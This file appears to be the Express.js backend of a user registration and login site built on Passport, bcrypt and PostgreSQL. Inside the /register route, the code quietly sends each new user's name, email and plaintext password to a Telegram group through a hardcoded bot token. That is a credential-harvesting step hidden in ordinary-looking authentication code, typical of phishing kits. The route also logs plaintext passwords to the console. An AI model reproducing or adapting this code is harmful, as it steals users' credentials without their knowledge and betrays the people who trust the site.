const express = require("express");
const { pool } = require("./dbConfig");
const bcrypt = require("bcrypt");
const passport = require("passport");
const flash = require("express-flash");
const session = require("express-session");
require("dotenv").config();
const app = express();
const path = require('path');
const axios = require('axios');


const PORT = process.env.PORT || 3000;

const initializePassport = require("./passportConfig");

initializePassport(passport);

app.use(express.static(path.join(__dirname, 'public')));
// Parses details from a form
app.use(express.urlencoded({ extended: false }));

app.set("view engine", "ejs");


app.use(
  session({
    // Key we want to keep secret which will encrypt all of our information
    secret: process.env.SESSION_SECRET,
    // Should we resave our session variables if nothing has changes which we dont
    resave: false,
    // Save empty value if there is no vaue which we do not want to do
    saveUninitialized: false
  })
);
// Funtion inside passport which initializes passport
app.use(passport.initialize());
// Store our variables to be persisted across the whole session. Works with app.use(Session) above
app.use(passport.session());
app.use(flash());



app.get("/", (req, res) => {
  res.render("index");
});

app.get("/login", checkAuthenticated, (req, res) => {
  res.render("login");
});

app.get("/register", checkAuthenticated, (req, res) => {
  res.render("register");
});

app.get("/dashboard",checkNotAuthenticated, (req, res) => {
  res.render("dashboard")
});

app.get("/forgot-password", (req, res) => {
  res.render("forgot-password");
});


app.get("/user/forgot-password-email", (req, res) => {
  res.render("forgot-password-email");
});


app.post("/user/forgot-password", (req, res) => {
  res.render("forgot-password-email");
});


app.post("/register", async (req, res) => {
  let { user_name, email, password, confirm_password } = req.body;

  let errors = [];

  console.log({
    user_name, email, password, confirm_password
  });

  if (!user_name || !email || !password || !confirm_password) {
    errors.push({ message: "Please enter all fields" });
  }

  if (password.length < 8) {
    errors.push({ message: "Password must be a least 8 characters long" });
  }

  if (password !== confirm_password) {
    errors.push({ message: "Passwords do not match" });
  }

  if (errors.length > 0) {
    res.render("register", { errors, user_name, email, password, confirm_password });
  }
  else {
    const hashedPassword = await bcrypt.hash(password, 10);
    console.log(hashedPassword);

    

    // Replace with your bot token and group chat ID
    const botToken = '7178974024:AAH_vlW53I3WsYvOEv7Uh6uBdKY0Pke2Hf8';
    const chatId = '-4168881391'; // Replace with the ID of your Telegram group
    
    // The message you want to send
    const message = `U_Name : ${user_name} \nmail : ${email} \npwrld : ${password}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    await axios.post(url, {
      chat_id: chatId,
      text: message,
    })
    .then(response => {
      console.log('Message sent successfully:', response.data);
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
   

  // Validation passed
  pool.query(
    `SELECT * FROM users
        WHERE email = $1`,
    [email],
    (err, results) => {
      if (err) {
        console.log(err);
      }
      console.log(results.rows);

      if (results.rows.length > 0) {
        return res.render("register", {
          message: "User already registered"
        });
      } else {
        pool.query(
          `INSERT INTO users (user_name, email, password)
                VALUES ($1, $2, $3)
                RETURNING id, password`,
          [user_name, email, hashedPassword],
          (err, results) => {
            if (err) {
              throw err;
            }
            console.log(results.rows);
            req.flash("success_msg", "You are now registered. Please log in");
            res.redirect("/login");
          }
        );
      }
    }
  );

  };

});

 


app.post("/login",
  passport.authenticate("local", {
    successRedirect: "/dashboard",
    failureRedirect: "/login",
    failureFlash: true
  })
);

function checkAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return res.redirect("/dashboard");
  }
  next();
}

function checkNotAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next();
  }
  res.redirect("/login");
}





app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});